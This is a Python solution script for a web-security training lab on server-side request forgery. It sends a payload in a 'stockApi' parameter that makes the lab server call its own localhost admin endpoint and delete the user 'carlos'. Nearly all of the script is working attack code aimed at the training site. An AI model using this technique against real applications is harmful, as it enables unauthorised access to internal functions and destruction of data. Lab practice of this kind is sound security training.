############################################################################
#
# Lab: Basic SSRF against the local server
#
# Hack Steps:
#      1. Inject payload into 'stockApi' parameter to delete carlos using
#         SSRF against the local server
#      2. Check that carlos doesn't exist anymore in the admin panel
#
############################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a79005b04c81af381cd67a700e500b5.web-security-academy.net" 

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "stockApi")

    payload = "http://localhost/admin/delete?username=carlos"
    data =  { "stockApi": payload }

    print(Fore.WHITE + "❯❯ Injecting payload to delete carlos using SSRF against the local server.. ", end="", flush=True)
    
    try:
        requests.post(f"{LAB_URL}/product/stock", data)

    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
